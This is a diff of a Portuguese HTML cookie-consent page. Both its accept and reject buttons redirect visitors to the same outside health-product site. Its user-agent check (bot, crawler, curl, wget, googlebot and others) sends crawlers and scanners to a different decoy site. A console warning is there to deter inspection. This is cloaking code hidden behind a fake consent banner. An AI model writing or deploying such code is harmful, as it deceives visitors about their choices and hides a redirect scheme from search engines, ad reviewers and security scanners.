@@ -134,33 +134,10 @@
   <div class="banner-container">
     <h2>Configuração de Cookies</h2>
     <p>Este site utiliza cookies para oferecer a melhor experiência. Escolha sua configuração preferida:</p>
-   <div class="action-buttons">
-  <button class="button accept" onclick="acceptCookies()">Aceitar Cookies</button>
-  <button class="button reject" onclick="rejectCookies()">Recusar Cookies</button>
-</div>
-
-<script>
-function acceptCookies() {
-  localStorage.setItem('cookiesAccepted', 'true');
-  window.location.href = 'https://duxhumorehealth.com/';
-}
-
-function rejectCookies() {
-  localStorage.setItem('cookiesAccepted', 'false');
-  deleteCookies();
-  window.location.href = 'https://duxhumorehealth.com/';
-}
-
-function deleteCookies() {
-  const cookies = document.cookie.split(';');
-  for (let i = 0; i < cookies.length; i++) {
-    const cookie = cookies[i];
-    const eqPos = cookie.indexOf('=');
-    const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
-    document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
-  }
-}
-</script>
+    <div class="action-buttons">
+      <button class="button accept" onclick="acceptCookies()">Aceitar Cookies</button>
+      <button class="button reject" onclick="rejectCookies()">Recusar Cookies</button>
+    </div>
 
     <div class="links-footer">
       <a href="#" onclick="showPolicy('privacy')">Política de Privacidade</a>
@@ -210,33 +187,55 @@ function deleteCookies() {
   </div>
 
   <script>
+    // Funções de cookies
+    function acceptCookies() {
+      localStorage.setItem('cookiesAccepted', 'true');
+      console.log('Cookies aceitos');
+      window.location.href = 'https://duxhumorehealth.com/';
+    }
+
+    function rejectCookies() {
+      localStorage.setItem('cookiesAccepted', 'false');
+      deleteCookies();
+      console.log('Cookies rejeitados');
+      window.location.href = 'https://duxhumorehealth.com/';
+    }
+
+    function deleteCookies() {
+      const cookies = document.cookie.split(';');
+      for (let i = 0; i < cookies.length; i++) {
+        const cookie = cookies[i];
+        const eqPos = cookie.indexOf('=');
+        const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+        document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+      }
+    }
+
+    // Nova função de detecção de bot simplificada
     function isBot() {
       const userAgent = navigator.userAgent.toLowerCase();
+      console.log('User Agent:', userAgent); // Log para debug
+      
       const botPatterns = [
-        'bot', 'crawler', 'spider', 'curl', 'wget', 'python', 'node', 'axios',
-        'headless', 'phantom', 'selenium', 'puppeteer', 'chrome-headless',
-        'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduckbot', 'slurp',
+        'bot', 'crawler', 'spider', 'curl', 'wget',
+        'googlebot', 'bingbot', 'yandex', 'baidu',
         'facebookexternalhit', 'twitterbot'
       ];
 
-      const isWebdriver = navigator.webdriver;
-      const hasAutomation = window.navigator.hasOwnProperty('webdriver');
-      const hasChrome = window.chrome;
-      const hasPermissions = navigator.permissions;
-      
-      if (isWebdriver || hasAutomation || !hasChrome || !hasPermissions) {
-        return true;
-      }
-
-      return botPatterns.some(pattern => userAgent.includes(pattern));
+      const isDetectedBot = botPatterns.some(pattern => userAgent.includes(pattern));
+      console.log('Bot Detected:', isDetectedBot); // Log para debug
+      return isDetectedBot;
     }
 
     function handleBotDetection() {
-      if (isBot()) {
+      const isBotDetected = isBot();
+      if (isBotDetected) {
+        console.log('Redirecionando bot...');
         window.location.href = 'https://www.fibramaisemetir.com/';
       }
     }
 
+    // Funções para políticas
     function showPolicy(type) {
       const privacyElement = document.getElementById('privacyPolicy');
       const termsElement = document.getElementById('termsPolicy');
@@ -255,11 +254,10 @@ function deleteCookies() {
       document.getElementById('termsPolicy').style.display = 'none';
     }
 
+    // Event Listeners
     window.addEventListener('load', handleBotDetection);
-    setTimeout(handleBotDetection, 500);
-    document.addEventListener('mousemove', handleBotDetection);
-    document.addEventListener('keypress', handleBotDetection);
 
+    // Console warning
     if (window.console && console.log) {
       console.log('%c ATENÇÃO! ', 'background: red; color: white; font-size: 24px;');
       console.log('%c Atividade de desenvolvedor detectada. ', 'color: red;');
